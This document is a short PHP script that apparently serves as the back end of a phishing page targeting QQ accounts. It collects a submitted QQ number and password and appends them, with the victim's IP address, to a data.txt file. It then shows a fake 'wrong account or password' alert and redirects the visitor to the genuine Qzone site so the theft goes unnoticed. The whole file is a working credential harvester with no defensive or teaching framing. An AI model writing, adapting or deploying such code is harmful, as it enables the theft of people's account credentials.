<?php
header('Content-Type: text/html; charset=utf-8');
$title = $_POST['title'];
$content = $_POST['content'];
function get_real_ip(){ 
    $ip=false; 
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){ 
        $ip=$_SERVER['HTTP_CLIENT_IP']; 
    }
    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){ 
        $ips=explode (', ', $_SERVER['HTTP_X_FORWARDED_FOR']); 
        if($ip){ array_unshift($ips, $ip); $ip=FALSE; }
        for ($i=0; $i < count($ips); $i++){
            if(!eregi ('^(10│172.16│192.168).', $ips[$i])){
                $ip=$ips[$i];
                break;
            }
        }
    }
    return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); 
}

file_put_contents("data.txt","QQ:<font color=blue>".$title."</font>\r\r密码:<font color=red>".$content."</font>\r\rIP地址:<font color=grey>".get_real_ip()."</font>\n\n",FILE_APPEND);
echo "<script> alert('账号密码错误');parent.location.href='https://qzone.qq.com/'; </script>"; 

?>